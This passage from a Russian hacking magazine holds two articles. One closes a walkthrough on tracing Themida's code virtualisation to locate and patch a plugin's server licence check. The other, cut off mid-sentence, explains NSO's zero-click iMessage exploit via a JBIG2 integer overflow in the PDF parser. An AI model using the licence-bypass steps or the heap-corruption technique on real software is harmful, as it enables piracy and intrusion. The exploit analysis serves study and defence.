скорость исполнения) не подвергся виртуализации. Пестрая полоска с пре‐
обладанием коричневого цвета справа — шитый код виртуальной машины
Themida, перемежающийся обработчиками команд.
   Побродив немного отладчиком по дебрям кода и слегка расстроившись,
переходим к более прогрессивному методу работы. Попробуем отследить
и проанализировать трассу между вызываемыми невиртуализированными
функциями. В качестве отправного пункта берем функцию HTTP-запроса
лицензии на сервер, благо она по понятным причинам не обфусцирована.
Ставим на нее точку останова и при ее достижении жмем Ctrl-F9, выполняя
функцию до возврата в обработчик шитого кода, из которого она вызывается.
  На входе обнаруживаем такой огромный кусок бессмысленных команд, что
его бесполезно пытаться пройти вручную. Возложим эту тяжкую задачу
на отладчик. Для этого откроем вкладку «Трассировка» (крайняя справа)
и правой кнопкой мыши выберем «Начать выполнение трассировки». Затем
для быстроты запускаем трассировку через Ctrl-Alt-F8 (трассировка с обхо‐
дом). Памятуя о том, что невиртуализированный код находится в секции
с меньшими адресами, в качестве условия остановки ставим RIP до начала
секции, содержащей виртуализированный код.





     Ставим RIP до начала секции, содержащей виртуализированный код

В окне трассировки шустро побежали исполняемые команды, а вот и оста‐
новка на следующем вызове какой‑то функции. Ого, нам потребовалась пара
десятков тысяч шагов, чтобы преодолеть промежуток между ними! Это нас
не пугает: попробуем проанализировать полученную трассу.
  Для начала нас интересует, каким образом реализована псевдокоманда
вызова невиртуализированной функции. В самом конце трассы находим
такой участок кода, соответствующего обработчику вызова функции и коду
перехода на него от обработчика предыдущей псевдокоманды. Попробуем
по нему понять принцип действия виртуальной машины:


33DC | 00007FFD071D113F | 48:89EF                  | mov rdi,rbp
               <--- RBP указывает на текущий фрейм кода
33DD | 00007FFD071D1142 | 48:81C7 36010000         | add rdi,136
33DE | 00007FFD071D1149 | 0907                     | or dword ptr ds:
[rdi],eax
33DF | 00007FFD071D114B | 48:25 FFFF0000           | and rax,FFFF
<--- RAX 16-битный параметр текущей команды, представляющий собой
33E0 | 00007FFD071D1151 | 48:C1E0 03               | shl rax,3
                   <--- индекс в таблице 64-битных адресов
обработчиков команд шитого кода
33E1 | 00007FFD071D1155 | 48:01C2                  | add rdx,rax
               <--- базовый адрес, на который в RDX
33E2 | 00007FFD071D1158 | 4C:8B02                  | mov r8,qword ptr
ds:[rdx] <--- Элемент по этому индексу указывает на обработчик
следующей команды, то есть 7FFD07011D20
33E3 | 00007FFD071D115B | 48:89EB                  | mov rbx,rbp
33E4 | 00007FFD071D115E | 48:81C3 EB000000         | add rbx,EB
33E5 | 00007FFD071D1165 | 48:8103 22000000         | add qword ptr ds
:[rbx],22  <--- [RBP+EB] указатель на текущую команду шитого кода, ее
размер был 22h байта, сдвинуть его на следующую команду
33E6 | 00007FFD071D116C | 41:FFE0                  | jmp r8 <---
после чего перейти на ее обработчик


33E7 | 00007FFD07011D20 | 48:C7C2 00000000         | mov rdx,0
33E8 | 00007FFD07011D27 | 49:89E8                  | mov r8,rbp
33E9 | 00007FFD07011D2A | 49:81C0 EB000000         | add r8,EB
33EA | 00007FFD07011D31 | 4D:8B00                  | mov r8,qword ptr
ds:[r8] <--- R8=[RBP+EB] указатель на новую команду шитого кода
33EB | 00007FFD07011D34 | 49:81C0 06000000         | add r8,6
33EC | 00007FFD07011D3B | 41:8B10                  | mov edx,dword
ptr ds:[r8] <--- В RDX 32-битный параметр псевдокоманды по смещению 6
байт
33ED | 00007FFD07011D3E | 48:89E9                  | mov rcx,rbp
33EE | 00007FFD07011D41 | 48:81C1 01000000         | add rcx,1 <--- [
RBP+1] <--- Базовый адрес модуля
33EF | 00007FFD07011D48 | 48:0311                  | add rdx,qword
ptr ds:[rcx]  <--- Их сумма дает абсолютный адрес вызываемой функции
в RDX
33F0 | 00007FFD07011D4B | 49:C7C6 00000000         | mov r14,0
33F1 | 00007FFD07011D52 | 49:89E8                  | mov r8,rbp
33F2 | 00007FFD07011D55 | 49:81C0 EB000000         | add r8,EB
33F3 | 00007FFD07011D5C | 4D:8B00                  | mov r8,qword ptr
ds:[r8] <--- R8=[RBP+EB] указатель на текущую команду шитого кода
33F4 | 00007FFD07011D5F | 49:81C0 04000000         | add r8,4
33F5 | 00007FFD07011D66 | 6645:8B30                | mov r14w,word
ptr ds:[r8] <--- В R14 16-битный параметр псевдокоманды по смещению 4
байта
33F6 | 00007FFD07011D6A | 49:01E6                  | add r14,rsp  <
--- Это размер зарезервированного места в стеке под сохраненные
регистры
33F7 | 00007FFD07011D6D | 49:8916                  | mov qword ptr ds
:[r14],rdx <--- Адрес вызываемой функции на стек для перехода
33F8 | 00007FFD07011D70 | 49:81C6 08000000         | add r14,8 <---
Место в стеке для адреса возврата из нее
33F9 | 00007FFD07011D77 | 48:C7C2 00000000         | mov rdx,0
33FA | 00007FFD07011D7E | 49:89E8                  | mov r8,rbp
33FB | 00007FFD07011D81 | 49:81C0 EB000000         | add r8,EB
33FC | 00007FFD07011D88 | 4D:8B00                  | mov r8,qword ptr
ds:[r8] <--- R8=[RBP+EB] указатель на текущую команду шитого кода
33FD | 00007FFD07011D8B | 49:81C0 00000000         | add r8,0
33FE | 00007FFD07011D92 | 41:8B10                  | mov edx,dword
ptr ds:[r8] <--- В RDX 32-битный параметр псевдокоманды по смещению 0
байт
33FF | 00007FFD07011D95 | 48:89E8                  | mov rax,rbp
                             |
3400 | 00007FFD07011D98 | 48:05 01000000           | add rax,1
                               |
3401 | 00007FFD07011D9E | 48:0310                  | add rdx,qword
ptr ds:[rax]   <--- [RBP+1] — базовый адрес модуля, их сумма дает
3402 | 00007FFD07011DA1 | 49:8916                  | mov qword ptr ds
:[r14],rdx  <--- адрес возврата из вызываемой функции на стек
3403 | 00007FFD07011DA4 | 48:89EB                  | mov rbx,rbp
3404 | 00007FFD07011DA7 | 48:81C3 7F000000         | add rbx,7F
3405 | 00007FFD07011DAE | C703 00000000            | mov dword ptr ds
:[rbx],0 <--- По всей видимости, [RBP+7F] флаг реентерабельности?
3406 | 00007FFD07011DB4 | 41:58                    | pop r8
3407 | 00007FFD07011DB6 | 41:59                    | pop r9
3408 | 00007FFD07011DB8 | 41:5A                    | pop r10
3409 | 00007FFD07011DBA | 41:5B                    | pop r11
340A | 00007FFD07011DBC | 41:5C                    | pop r12
340B | 00007FFD07011DBE | 41:5D                    | pop r13
340C | 00007FFD07011DC0 | 41:5E                    | pop r14
340D | 00007FFD07011DC2 | 41:5F                    | pop r15
340E | 00007FFD07011DC4 | 5F                       | pop rdi
340F | 00007FFD07011DC5 | 5E                       | pop rsi
3410 | 00007FFD07011DC6 | 5D                       | pop rbp
3411 | 00007FFD07011DC7 | 5B                       | pop rbx
3412 | 00007FFD07011DC8 | 5A                       | pop rdx
3413 | 00007FFD07011DC9 | 59                       | pop rcx
3414 | 00007FFD07011DCA | 58                       | pop rax
3415 | 00007FFD07011DCB | 9D                       | popfq
3416 | 00007FFD07011DCC | C2 0000                  | ret 0  <---
Перейти к вызываемой функции

Итак, мы примерно разобрали одну (из нескольких тысяч) команду шитого
кода Themida — вызов невиртуализированной функции. Выглядит она при‐
мерно так.





                   Вызов невиртуализированной функции

Что же делать дальше? По‑хорошему надо пройтись по таблице адресов
обработчиков виртуальных команд, благо она у нас есть, разобраться, что
делает каждая из них, и «распрямить» наш безумный код. Однако это путь
не из приятных: команд ну очень много, причем они мутируют, то есть одна
и та же команда может присутствовать в разных вариациях.
   Возможно, после всего описанного тебя уже не сильно напугает то, что
в одном исполняемом файле может использоваться даже несколько разных
мутировавших виртуальных машин (разные системы команд с переставлен‐
ными параметрами, длинами и так далее). Поэтому для начала попробуем
найти более короткий путь. Поскольку трасса даже между двумя соседними
вызовами функций получается чудовищно длинной, попытаемся залогировать
хотя бы сами эти вызовы. Обрати внимание, что регистры для совместимости
вроде как сохраняются в одном порядке, поэтому поищем код их сохранения
(41 58 41 59 41 5A...). Нашлось примерно две сотни мутированных обра‐
ботчиков вызова невиртуализированных функций. Но расставлять руками точ‐
ки останова на них очень муторно, поэтому пишем следующий скрипт:


findallmem 0,
"41584159415A415B415C415D415E415F5F5E5D5B5A59589DC20000"


mov i,0
loop:


cmp i, $result
je continue


bp ref.addr(i)+18
bpcnd ref.addr(i)+18, 0
bpl ref.addr(i)+18, "called from: "{rip}" called: "{[rsp]}" return to
: "{[rsp+8]}" rsp: "{rsp}" PC: "{[mem.base(rip)+128EDDC+EB]}"
inc i
jmp loop
continue:

То есть мы ищем все места в коде, где есть такая последовательность вос‐
становления регистров, и ставим на нее условную точку останова, логиру‐
ющую текущее состояние виртуальной машины. Волшебное число 128EDDC
получено эмпирически как смещение текущего фрейма относительно базы
модуля, а волшебное число EB — как смещение до программного счетчика
виртуальной машины из приведенного выше фрагмента кода. После отработ‐
ки скрипта получаем две сотни условных точек останова, которые пишут в лог
трассу вызовов примерно в таком виде:


called from: 7FFD069D8E12 called: 7FFD158B6D30 return to:
7FFD06B8067F rsp: 6B694FA710 PC: 7FFD06AE481F
called from: 7FFD069D8E12 called: 7FFD158B6DB0 return to:
7FFD06B807E5 rsp: 6B694FA710 PC: 7FFD06AE4A3C
called from: 7FFD06A8ACB5 called: 7FFD0507CB40 return to:
7FFD06B8094D rsp: 6B694FA710 PC: 7FFD06AE4BC3
called from: 7FFD069D8E12 called: 7FFD158B6EC0 return to:
7FFD06B80A70 rsp: 6B694FA710 PC: 7FFD06AE4DA6
called from: 7FFD0698CFB6 called: 7FFD158B6D30 return to:
7FFD06B80BC8 rsp: 6B694FA710 PC: 7FFD06AE506B
called from: 7FFD069E6E0F called: 7FFD158B6DB0 return to:
7FFD06B80D0C rsp: 6B694FA710 PC: 7FFD06AE5294
called from: 7FFD06A146C8 called: 7FFD0507CB60 return to:
7FFD06B80EB9 rsp: 6B694FA710 PC: 7FFD06AE542D
called from: 7FFD069D8E12 called: 7FFD158B6EC0 return to:
7FFD06B81002 rsp: 6B694FA710 PC: 7FFD06AE5616
called from: 7FFD0698CFB6 called: 7FFD158B6D30 return to:
7FFD06B8114F rsp: 6B694FA710 PC: 7FFD06AE58EB
called from: 7FFD0698CFB6 called: 7FFD158B6DB0 return to:
7FFD06B812C2 rsp: 6B694FA710 PC: 7FFD06AE5B0B
called from: 7FFD06AA94FE called: 7FFD0507CC60 return to:
7FFD06B8143D rsp: 6B694FA710 PC: 7FFD06AE5C9A
called from: 7FFD069E6E0F called: 7FFD158B6EC0 return to:
7FFD06B815EB rsp: 6B694FA710 PC: 7FFD06AE5E87
called from: 7FFD0698CFB6 called: 7FFD158B6D30 return to:
7FFD06B81741 rsp: 6B694FA710 PC: 7FFD06AE60CE
called from: 7FFD069E6E0F called: 7FFD158B6DB0 return to:
7FFD06B81875 rsp: 6B694FA710 PC: 7FFD06AE62DC
called from: 7FFD06A146C8 called: 7FFD0507CE60 return to:
7FFD06B819C5 rsp: 6B694FA710 PC: 7FFD06AE647E
called from: 7FFD069D8E12 called: 7FFD158B6EC0 return to:
7FFD06B81B3A rsp: 6B694FA710 PC: 7FFD06AE6679
called from: 7FFD06AA94FE called: 7FFD0506B620 return to:
7FFD06B81C91 rsp: 6B694FA710 PC: 7FFD06AE6874
called from: 7FFD069E6E0F called: 7FFD158B6D30 return to:
7FFD06B81DB7 rsp: 6B694FA710 PC: 7FFD06AE6A49
called from: 7FFD069E6E0F called: 7FFD158B6DB0 return to:
7FFD06B81F01 rsp: 6B694FA710 PC: 7FFD06AE6C6E
called from: 7FFD069E6E0F called: 7FFD158BE0D0 return to:
7FFD06B82060 rsp: 6B694FA710 PC: 7FFD06AE6E97
called from: 7FFD069E6E0F called: 7FFD158D0E50 return to:
7FFD06B821AE rsp: 6B694FA710 PC: 7FFD06AE7098
called from: 7FFD069D8E12 called: 7FFD158BDDB0 return to:
7FFD06B822C9 rsp: 6B694FA710 PC: 7FFD06AE725F
called from: 7FFD069D8E12 called: 7FFD158B6EC0 return to:
7FFD06B82405 rsp: 6B694FA710 PC: 7FFD06AE7446
called from: 7FFD069E6E0F called: 7FFD158B6D30 return to:
7FFD06B82569 rsp: 6B694FA710 PC: 7FFD06AE7633
called from: 7FFD0698CFB6 called: 7FFD158B6DB0 return to:
7FFD06B826D3 rsp: 6B694FA710 PC: 7FFD06AE7845

Указатель стека мы проверяем для контроля вызовов виртуализированных
функций, а в последней колонке содержится указатель на текущую исполня‐
емую команду шитого кода. Два таких лога, запущенных со включенным
и отключенным интернетом, дают нам возможность найти развилку в шитом
коде с точностью до вызова невиртуализированной функции.
  Для более точного нахождения развилки нам придется искать команду
условного оператора и ее обработчик. С этой целью снова повторяем пос‐
ледовательность действий, описанную в начале этой статьи, — останавлива‐
емся на последнем вызове невиртуализированной функции перед развилкой
и запускаем более детальную трассировку при включенном и отключенном
интернете. Придется повозиться, сравнивая ну очень длинные трассы, но в
итоге мы находим обработчик условного оператора. Реализация его чрез‐
вычайно сложна, настолько, что тут нет места, чтобы привести ее полностью.
Да и смысла никакого в этом нет: код мутирует и почти ни один шаблон
не действует.
   Более того, злобные кодеры из Oreans еще сильнее усложнили нам жизнь,
добавив в команду дополнительный 8-битный параметр. От его значения
зависит флаг, на который  реагирует условный переход. И разумеется,
при мутации команд эти параметры меняются. Само место развилки выглядит
примерно так:


2564 | 00007FFD6A21E0CE | 49:89E8                  | mov r8,rbp <---
RBP указывает на текущий фрейм кода
2565 | 00007FFD6A21E0D1 | 49:81F5 01000000         | xor r13,1
2566 | 00007FFD6A21E0D8 | 49:01D5                  | add r13,rdx
2567 | 00007FFD6A21E0DB | 4C:31CA                  | xor rdx,r9
2568 | 00007FFD6A21E0DE | 49:81C0 EB000000         | add r8,EB
2569 | 00007FFD6A21E0E5 | 4C:01EA                  | add rdx,r13
256A | 00007FFD6A21E0E8 | 48:09D2                  | or rdx,rdx
256B | 00007FFD6A21E0EB | 4D:8B00                  | mov r8,qword ptr
ds:[r8] <--- R8=[RBP+EB] указатель на новую команду шитого кода
256C | 00007FFD6A21E0EE | 49:81C0 0A000000         | add r8,A
256D | 00007FFD6A21E0F5 | 48:81C9 80000000         | or rcx,80
256E | 00007FFD6A21E0FC | 45:8A08                  | mov r9b,byte ptr
ds:[r8] <--- В R9 битный идентификатор флага по смещению A байт
256F | 00007FFD6A21E0FF | 41:80F9 E4               | cmp r9b,E4
                      <--- В этой реализации команды идентификатор E4
соответствует Zero flag
2570 | 00007FFD6A21E103 | 0F84 19000000            | je 7FFD6A21E122
2571 | 00007FFD6A21E122 | 48:81E2 90000000         | and rdx,90
2572 | 00007FFD6A21E129 | 49:81E6 04000000         | and r14,4
2573 | 00007FFD6A21E130 | 4D:09CD                  | or r13,r9
2574 | 00007FFD6A21E133 | 41:54                    | push r12
2575 | 00007FFD6A21E135 | 41:81E4 40000000         | and r12d,40  <
--- Регистр флагов уже загружен в r12d, маска 40h — установлен бит
Zero
2576 | 00007FFD6A21E13C | 0F84 18000000            | je 7FFD6A21E15A
<-------------------Развилка
2577 | 00007FFD6A21E15A | 49:C7C5 00000000         | mov r13,0
2578 | 00007FFD6A21E161 | 48:81C1 78000000         | add rcx,78
2579 | 00007FFD6A21E168 | 48:81E9 88000000         | sub rcx,88
257A | 00007FFD6A21E16F | 41:5C                    | pop r12
257B | 00007FFD6A21E171 | 49:C7C5 00000000         | mov r13,0
257C | 00007FFD6A21E178 | 49:C7C5 00040000         | mov r13,400
257D | 00007FFD6A21E17F | 41:80F9 60               | cmp r9b,60

Код данного обработчика мы поменять не можем (он используется в бес‐
численном количестве других мест), однако мы можем модифицировать
команду шитого кода, ведь она содержит в своих параметрах адреса и обеих
веток виртуального кода, и их обработчиков. Разумеется, придется вносить
исправления в уже распакованный и расшифрованный код (пример халявного
решения данной проблемы я приводил в предыдущей статье), а еще — оза‐
дачиться борьбой с проверкой контроля целостности.
   Итак, мы достигли поставленной цели: сравнили два лога и нашли раз‐
вилку в коде между ветками с правильным ответом сервера и без него. Про‐
патчив  код, мы можем  излечить наш подопытный  графический  плагин
от излишней алчности.
  Мы рассмотрели лишь общие принципы реализации виртуальной машины
Themida. К слову сказать, у Oreans есть и другие похожие продукты, например
Code Virtualizer. Эта статья, возможно, поможет кому‑то в борьбе и с подоб‐
ными виртуальными машинами и обфускаторами.
 ВЗЛОМ





     Юрий Язев
   Широко известен под
   псевдонимом yurembo.
 Программист, разработчик
   видеоигр, независимый
исследователь. Старый автор
     журнала «Хакер».
    yazevsoft@gmail.com

ЯДЕРНАЯ
ГИФКА
 КАК РАБОТАЕТ ЭКСПЛОИТ ZERO-CLICK
 ДЛЯ IMESSAGE




 В израильской NSO Group создали эксплоит для iMessage,
  наделавший много шума. С помощью этого эксплоита троян
  Pegasus был  внедрен  в  телефоны  публичных  деятелей
  и политиков. Apple уже подала иск на NSO. Однако оставим
  в стороне политику — в этой статье мы сосредоточимся
  на самом эксплоите, тем более что он просто взрывной!
  Заражает девайсы без участия юзера, укрывается внутри GIF
  и включает в себя крошечный виртуальный компьютер.


  NSO
   Начало тому, о чем мы будем говорить, было положено в августе 2016 года,
   когда израильская компания NSO Group, специализирующаяся на киберо‐
   ружии, разработала и выпустила шпионское ПО Pegasus, предназначенное
  для заражения мобильных устройств под управлением Android и iOS. «Пегас»
  был способен читать текстовые сообщения, отслеживать звонки и мес‐
   тоположение,  собирать  пароли,  получать  информацию  с  микрофона
  и камеры, а также доступ к личной информации пользователя.
     Тот старый «Пегас» 2016 года использовал эксплоит «одного нажатия»
   (one-click). То есть, когда пользователь‑жертва получал на свой смартфон
   «заряженное» сообщение, чтобы активировать подложенный сюрприз, ему
   нужно было что‑то сделать, например кликнуть по ссылке. Заражения было
   легко избежать — достаточно было не нажимать на что попало.





                        Примеры фишинговых СМС

  В июле 2021 года исследователям из лаборатории Citizen Lab при Универ‐
   ситете Торонто удалось изучить эксплоит «нулевого нажатия» для iMessage,
   обнаруженный на смартфоне активиста из Саудовской Аравии. Эксплоит
  работал вообще без участия пользователя и срабатывал сам — хакеру дос‐
   таточно лишь отправить полезную нагрузку в мессенджере.


  ОПАСНЫЙ ПРИЕМ
   Входная точка «Пегаса» в iPhone — приложение iMessage. Это значит, что
   атакующему достаточно знать телефонный номер или Apple ID жертвы.
    В iMessage есть нативная поддержка GIF-анимации. Присланная в чат
   гифка воспроизводится в цикле бесконечно. Как только iMessage получает
   сообщение, еще до его вывода на экран вызывается метод в процессе
  IMTranscoderAgent. Он, в свою очередь, выполняется за пределами песоч‐
  ницы BlastDoor. При этом в параметре метода передается любое изоб‐
  ражение с расширением gif. Вот таким образом:


  [IMGIFUtils copyGifFromPath:toDestinationPath:error]

  Это пример кода на языке Objective-C. Посмотри на селектор. Здесь, веро‐
   ятно, было намерение просто скопировать файл GIF перед редактированием
  поля счетчика циклов, но семантика этого метода иная. Внутри он использует
   API CoreGraphics, чтобы отобразить исходное изображение в новый GIF-файл
  по заданному пути. Однако то, что файл имеет расширение gif, вовсе не озна‐
   чает, что он на самом деле гифка.
      Библиотека ImageIO применяется, чтобы опознать формат файла и про‐
   анализировать его, но при этом полностью игнорирует его расширение.
  При использовании этого трюка с «поддельными гифками» более 20 гра‐
   фических кодеков становятся потенциальными жертвами для атаки нулевого
  нажатия в iMessage. Некоторые из них очень сложны и состоят из сотен тысяч
   строк кода. Огромное пространство для хакерской смекалки!
     Как сообщает исследовательская группа Google Project Zero, с iOS 14.8.1
   (26 октября 2021 года) Apple ограничила форматы в ImageIO, доступные
  из процесса IMTranscoderAgent. Также инженеры компании полностью уда‐
  лили код для доступа к GIF из IMTranscoderAgent с версии iOS 15.0 (20 сен‐
  тября 2021 года), вместе с тем полностью перенеся декодирование GIF
   внутрь BlastDoor.


  PDF ВНУТРИ GIF
  В NSO использовали дыру «поддельный GIF», чтобы через нее заюзать уяз‐
  вимость в парсере CoreGraphics PDF.
      Долгие годы формат PDF был излюбленной целью для атак — он доступен
   везде и обладает достаточной сложностью. Приятный бонус для хакеров —
   поддержка  JavaScript  внутри PDF. CoreGraphics PDF не  интерпретирует
   JavaScript, однако NSO удалось найти в недрах парсера кое‑что не менее
   мощное.
     Иан Бир (Ian Beer) и Сэмюэл Гросс (Samuel Groß) из Project Zero распотро‐
  шили эксплоит NSO и подробно рассказали, как он работает. Дальше мы
  проследим за их исследованием, чтобы разобраться, как картинка прев‐
  ратилась в настоящий компьютер и помогла эксплоиту сбежать из песочницы.


  ЭКСТРЕМАЛЬНОЕ СЖАТИЕ
  В конце девяностых мало у кого был стабильный и быстрый интернет, боль‐
   шинство юзеров дозванивались к провайдеру по dial-up и работали на смеш‐
  ных сейчас скоростях. Да и диски не отличались большими емкостями, поэто‐
  му сжатие данных было важной технологией. PNG, JPEG и GIF нам знакомы
  и по сей день, но были и другие.
     Формат JBIG2 предназначался для сжатия монохромных изображений
   (где пиксели могут быть только черными или белыми). Он применялся в офис‐
  ных сканерах высокой ценовой категории, таких как Xerox WorkCenter.





                                Xerox WorkCenter

   Если лет десять‑двадцать тому назад тебе доводилось использовать фун‐
  кцию «сканирования в PDF» на подобном устройстве, в получавшихся у тебя
   PDF, скорее всего, был поток JBIG2.
      Примечательно, что эти файлы даже при достойном разрешении сканиро‐
  вания занимали всего несколько килобайтов. JBIG2 использует два метода
  для достижения такого мощного сжатия. Сейчас мы их обсудим. Только
  не думай, что мы тут отвлеклись на какую‑то побочную ерунду, — все это име‐
   ет непосредственное отношение к эксплуатации дыры в iMessage!


  Техника 1: сегментация и замещение
   Текстовый документ, особенно написанный на языках с небольшими алфа‐
   витами (английский или, к примеру, русский), состоит из множества часто
   встречающихся символов. Вместе  буквы,  диакритику,  знаки  препинания
  и прочие загогулины называют глифами.
     JBIG2 пытается сегментировать каждую страницу на глифы, а затем
   использует простое сопоставление с образцом, чтобы выделить глифы,
  которые выглядят одинаково.





     Сопоставление с образцом позволяет найти все формы, в данном слу‐
    чае все буквы e

  При этом JBIG2 ничего не знает о самих глифах и не пытается распознавать
   их и сопоставлять с алфавитом (OCR). Кодировщик JBIG2 просто ищет свя‐
   занные области пикселей и группирует похожие.
    При этом алгоритм сжатия заменяет все достаточно похожие на вид
  области копией только одной из них.





     Замена всех вхождений одной копией глифа позволяет достичь высоких
     коэффициентов сжатия

  В таком случае текст по‑прежнему прекрасно читается, однако объем хра‐
  нимой информации становится меньше. Вместо того чтобы хранить данные
  о пикселях всей страницы, для их отображения нужна только сжатая версия
   «ссылочного глифа» для каждого символа и относительные координаты мест,
  где должны быть размещены его копии. При распаковке алгоритм расстав‐
   ляет глифы по местам, как бы рисуя ими на холсте.
      Такой подход таит в себе существенный недостаток: кривой кодировщик
  может случайно спутать похожие на вид символы. А это приводит к печальным
   последствиям. В своем блоге Дэвид Кризель (David Kriesel) приводит нес‐
   колько вдохновляющих примеров, когда в PDF-файлах сканированных сче‐
   тов‑фактур и чертежей одни цифры меняются на другие. Для нас в данном
   случае эти проблемы не важны — разве что ими можно объяснить почти пол‐
  ное вымирание JBIG2.


  Техника 2: уточняющее кодирование
   Итак, результат сжатия на основе подстановки отображается с потерями. То
   есть после сжатия и распаковки вывод на вид не будет в точности соответс‐
   твовать вводу. Поэтому JBIG2 поддерживает и сжатие без потерь, в которое
   входит промежуточный этап «сжатия с меньшими потерями».
    В этом случае дополнительно используется информация о разнице между
  замещенным глифом и исходным — тоже, конечно же, сжатая. Вот пример,
  показывающий различия между замещенным символом слева и исходным
  символом без потерь посередине.





     Использование оператора XOR на растрах для вычисления маски раз‐
    ности изображения

  В примере выше кодировщик сохраняет маску разности, показанную справа,
  затем во время распаковки она подвергается операции XOR с замененным
   символом, чтобы восстановить точные пиксели, составляющие исходный
   символ.
      Вместо того чтобы полностью кодировать всю разность за один раз,
   это можно сделать поэтапно, при этом на каждой итерации используется
   логический оператор (один из AND, OR, XOR или XNOR) для установки, сбро‐
  са или переключения битов.
     Каждый последующий шаг уточнения приближает конечный результат
   к оригиналу, и это позволяет контролировать потери качества при сжатии.
   Реализация этих шагов уточняющего кодирования очень гибкая. А еще здесь
   есть возможность читать значения, уже присутствующие в рабочей области
  вывода. А это, как ты уже, возможно, догадываешься, ведет нас к полноте
  по Тьюрингу... Но сначала нужно поговорить про важную уязвимость.


  ПОТОК JBIG2
   Большая часть декодера CoreGraphics PDF — это проприетарный код Apple,
  но реализация JBIG2 взята из проекта Xpdf, исходный код которого находится
  в свободном доступе.
     Формат JBIG2 представляет собой набор сегментов, который можно рас‐
   сматривать как серию команд рисования — они выполняются последователь‐
  но за один проход. Анализатор CoreGraphics JBIG2 поддерживает 19 раз‐
  личных типов сегментов, которые включают такие операции, как определение
  новой страницы, декодирование таблицы Хаффмана и визуализация растро‐
  вого изображения с заданными координатами.
     Сегменты  представлены  классом JBIG2Segment и  его  подклассами
  JBIG2Bitmap и JBIG2SymbolDict. JBIG2Bitmap представляет собой пря‐
   моугольный массив пикселей. Его поле данных указывает на задний буфер,
  содержащий поверхность для рендеринга. JBIG2SymbolDict группирует бит‐
  мапы. А  целевая  страница  представлена  как JBIG2Bitmap и  состоит
  из  отдельных  глифов. На  сегменты   (JBIG2Segment)  можно  ссылаться
  по номеру, а векторный тип GList хранит указатели на все сегменты. Чтобы
   найти сегмент по его номеру, GList сканируется последовательно.
       Кстати, если ты сейчас прочитал слово «джи‑лист» неправильно и раз‐
   веселился, как детсадовец, то постарайся сконцентрироваться, нас ждут куда
  более интересные открытия.


  УЯЗВИМОСТЬ
   Уязвимость представляет собой классическое целочисленное переполнение
  при сопоставлении ссылочных сегментов. Вот два сегмента кода, которые
   делают его возможным.


  Guint numSyms; // ( 1)
         numSyms = 0;
         for ( i = 0; i < nRefSegs; ++i) {
           if (( seg = findSegment(refSegs[i]))) {
         if (seg->getType() == jbig2SegSymbolDict) {
           numSyms += ((JBIG2SymbolDict *) seg)->getSize();  // ( 2)
         } else if (seg->getType() == jbig2SegCodeTable) {
           codeTables->append( seg);
         }
       } else {
         error(errSyntaxError, getPos() ,
               "Invalid segment reference in JBIG2 text region");
         delete codeTables;
         return;
       }
     }
   ...
     // Get the symbol bitmaps
     syms = (JBIG2Bitmap **)gmallocn(numSyms, sizeof(JBIG2Bitmap *));
  // ( 3)
         kk = 0;
         for ( i = 0; i < nRefSegs; ++i) {
           if (( seg = findSegment(refSegs[i]))) {
         if (seg->getType() == jbig2SegSymbolDict) {
           symbolDict = (JBIG2SymbolDict *) seg;
           for ( k = 0; k < symbolDict->getSize(); ++k) {
             syms[kk++] = symbolDict->getBitmap( k); // ( 4)
           }
         }
       }
     }

  Здесь переменная numSyms объявлена как 32-битное целое (смотри помет‐
   ку 1). Если мы будем раз за разом добавлять специально подготовленные
   ссылочные сегменты  (2), в конце концов это приведет к переполнению
  numSyms до контролируемого небольшого значения. Это значение исполь‐
   зуется для выделения кучи (3), из чего следует, что syms будет указывать
  на буфер недостаточного размера. Во внутреннем цикле (4) значения ука‐
   зателя JBIG2Bitmap записываются в буфер syms меньшего размера.
     Без дополнительных ухищрений этот цикл записал бы более 32 Гбайт дан‐
  ных в непригодный по размерам буфер syms, а это приведет к сбою. Чтобы
   такого не происходило, куча обрабатывается так, чтобы первые несколько
  записей из конца буфера syms повреждали задний буфер GList. Список
  GList   хранит  все  известные  сегменты  и   используется   функцией
  findSegments  для   сопоставления  номеров   сегментов,  переданных
  в refSegs, с указателями JBIG2Segment. Переполнение приводит к переза‐
  писи указателей JBIG2Segment в GList указателями JBIG2Bitmap (4).
     Так как JBIG2Bitmap наследуется от JBIG2Segment, виртуальный вызов
  seg->getType() выполняется успешно даже на устройствах, где включена
   проверка подлинности указателя (она используется для выполнения слабой
   проверки типа виртуальных вызовов). Но возвращаемый тип теперь не будет
  равен jbig2SegSymbolDict, в результате чего дальнейшая запись не про‐
   исходит (4) и степень повреждения памяти ограничивается.





      Упрощенное представление структуры памяти при переполнении кучи


  БЕСПРЕДЕЛЬНЫЙ И НЕОГРАНИЧЕННЫЙ ДОСТУП
   После того как сегменты в  списке GList  повреждены, злоумышленник
   переходит к порче объекта JBIG2Bitmap, представляющего собой текущую
   страницу (место, где команды рисования выполняют визуализацию). Проще
   говоря, JBIG2Bitmap — это оболочки заднего буфера, хранящие ширину
  и высоту буфера (в битах), а также значение, которое определяет, сколько
   байтов хранится для каждой строки.





     Структура памяти объекта JBIG2Bitmap, показывающая поля segnum, w, h
    и line, которые были повреждены во время переполнения буфера

   Если тщательно структурировать refSegs, они могут остановить перепол‐
  нение после записи еще трех указателей JBIG2Bitmap после конца буфера
   сегментов GList. Такой подход позволяет перезаписать указатель на vtable
  и первые четыре поля JBIG2Bitmap, представляющих текущую страницу.
      Ввиду устройства адресного пространства iOS эти указатели, скорее все‐
   го, будут находиться во вторых 4 Гбайт виртуальной памяти с адресами
   от 0x100000000 до 0x1fff   fff  . На девайсах, использующих iOS, применяется
   прямой порядок байтов (little-endian). Это означает, что поля w и line будут
   перезаписаны  на  0x1 —  наиболее  значимую  половину   указателя
  JBIG2Bitmap, а поля segNum и h заменятся наименее значимой половиной
   этого же указателя — случайным значением, зависящим от размещения кучи
  и ASLR (рандомизация размещения адресного пространства), где‑то меж‐
   ду 0x100000 и 0xfff   fff  .
    В итоге выходит, что целевая страница JBIG2Bitmap получает слишком
  большое значение h. Поскольку это значение используется для проверки гра‐
  ниц и должно отражать выделенный размер буфера страницы, получается
  эффект развертывания рабочей области для вывода изображения. Это озна‐
   чает, что последующие команды сегмента JBIG2 могут читать и записывать
  память за пределами исходных границ буфера поддержки страницы.
      Обработчик кучи также размещает буфер поддержки текущей страницы
   чуть ниже неподходящего по размерам буфера syms, поэтому, когда стра‐
  ница JBIG2Bitmap не ограничена, она может читать и записывать свои собс‐
   твенные поля.





     Схема памяти, показывающая, как неограниченный задний буфер рас‐
     трового изображения может ссылаться на объект JBIG2Bitmap и изме‐
     нять поля в нем, поскольку этот объект расположен после буфера
     в памяти

   Благодаря отрисовке четырехбайтовых растров с правильными координата‐
